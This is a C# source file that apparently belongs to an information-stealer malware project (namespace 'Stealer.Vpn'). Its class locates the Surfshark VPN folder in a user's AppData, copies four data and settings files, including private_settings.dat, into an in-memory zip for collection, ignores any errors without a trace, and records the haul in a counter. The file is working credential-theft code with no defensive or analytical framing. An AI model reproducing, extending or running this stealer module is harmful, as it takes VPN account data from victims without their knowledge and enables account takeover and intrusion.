using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Vpn
{
    internal class SurfShark : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Surfshark");
            if (!Directory.Exists(text))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Surfshark";
            string[] array = new string[4] { "data.dat", "settings.dat", "settings-log.dat", "private_settings.dat" };
            foreach (string path in array)
            {
                try
                {
                    string path2 = Path.Combine(text, path);
                    if (File.Exists(path2))
                    {
                        zip.AddFile(Path.Combine("Surfshark", path), File.ReadAllBytes(path2));
                    }
                }
                catch
                {
                }
            }
            counterApplications.Files.Add(text + " => Surfshark");
            counterApplications.Files.Add("Surfshark\\");
            counter.Vpns.Add(counterApplications);
        }
    }

}
